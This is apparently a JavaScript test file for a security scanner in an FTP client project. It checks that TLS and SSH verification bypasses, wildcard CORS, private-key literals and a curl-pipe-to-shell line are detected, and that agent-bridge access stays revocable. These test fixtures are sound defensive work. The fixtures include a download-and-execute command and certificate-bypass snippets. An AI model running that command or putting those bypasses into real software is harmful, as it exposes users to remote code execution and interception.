import assert from "node:assert/strict";
import test from "node:test";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import {scanDangerous,audit} from "./full-security-code-audit.mjs";

test("detects explicit TLS and SSH trust verification bypasses in shipping paths",()=>{
  const cases=[
    ['ghostftp-desktop/src-tauri/src/session/ftp.rs','danger_accept_invalid_certs(true)',"tls-certificate-bypass"],
    ['tools/ghostftp-runtime/main.go','&tls.Config{InsecureSkipVerify: true}',"tls-certificate-bypass"],
    ['macos/Sources/GhostFTPMacApp/Services/SSH.swift','StrictHostKeyChecking=no',"ssh-host-key-bypass"],
    ['tools/ghostftp-installer/main.go','curl -k https://example.invalid',"unsafe-curl-tls"]
  ];
  for(const [path,source,id] of cases)assert.equal(scanDangerous(path,source)[0]?.id,id);
});
test("never treats human documentation or test fixtures as shipped runtime",()=>{
  assert.deepEqual(scanDangerous("docs/audits/SECURITY.md","curl -k"),[]);
  assert.deepEqual(scanDangerous("macos/Tests/Mock.swift","StrictHostKeyChecking=no"),[]);
  assert.deepEqual(scanDangerous("ghostftp-desktop/src-tauri/src/known_hosts.rs","safe nofollow secure"),[]);
});
test("real repository security gates remain present and no obvious unsafe trust bypass ships",()=>{
  const report=audit();
  assert.ok(report.inventory.sourceFileCount>150);
  assert.deepEqual(report.blockingPatterns,[]);
  assert.deepEqual(report.missingSecurityGuards,[]);
  assert.equal(report.passed,true);
  assert.ok(report.findings.some(x=>x.surface==="macos FTPS/SFTP" && x.state==="not-implemented"));
});

test("persisted Agent Bridge authorization remains revocable through Security settings", () => {
  const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");
  const read = (file) => fs.readFileSync(path.join(root, file), "utf8");
  const ui = read("ghostftp-desktop/src/components/Settings.tsx");
  const store = read("ghostftp-desktop/src/stores/bridgeStore.ts");
  const ipc = read("ghostftp-desktop/src/lib/ipc.ts");
  const commands = read("ghostftp-desktop/src-tauri/src/commands.rs");
  const native = read("ghostftp-desktop/src-tauri/src/bridge.rs");
  const app = read("ghostftp-desktop/src-tauri/src/lib.rs");
  assert.ok(ui.includes("<AgentBridgeSecurityCard/>"), "Agent Bridge controls must stay reachable");
  assert.ok(ui.includes("Confirm revoke all access"), "revocation requires explicit UI confirmation");
  assert.ok(ui.includes("status.policy.allowAll"), "automatic approval must be visible");
  assert.ok(ui.includes("status.enabledSessions"), "live session grants must be visible");
  assert.ok(store.includes("ipc.bridgeRevokeAllAccess()"));
  assert.ok(ipc.includes('invoke<BridgeStatus>("bridge_revoke_all_access")'));
  assert.ok(commands.includes("pub async fn bridge_revoke_all_access"));
  assert.ok(app.includes("commands::bridge_revoke_all_access,"));
  assert.ok(native.includes("pub async fn revoke_all_access"));
  assert.ok(native.includes("config.enabled_profiles.is_empty()"));
  assert.ok(native.includes("revoke_all_access_clears_runtime_profiles_and_approval_policy"));
});

test("repository security inventory finds every occurrence and prohibits unsafe browser/CLI bridges", () => {
  const source = [
    "Access-Control-Allow-Origin: *",
    "Access-Control-Allow-Origin: *",
    "-----BEGIN PRIVATE KEY-----",
    "curl https://untrusted.invalid/unsafe.sh | sh"
  ].join("\n");
  const events = scanDangerous("ghostftp-desktop/src-tauri/src/bridge.rs", source);
  assert.equal(events.filter((event) => event.id === "unsafe-local-cors").length, 2);
  assert.ok(events.some((event) => event.id === "private-key-literal"));
  assert.ok(events.some((event) => event.id === "curl-pipe-shell"));
  assert.deepEqual(events.filter((event) => event.id === "unsafe-local-cors").map((event) => event.line), [1, 2]);
});
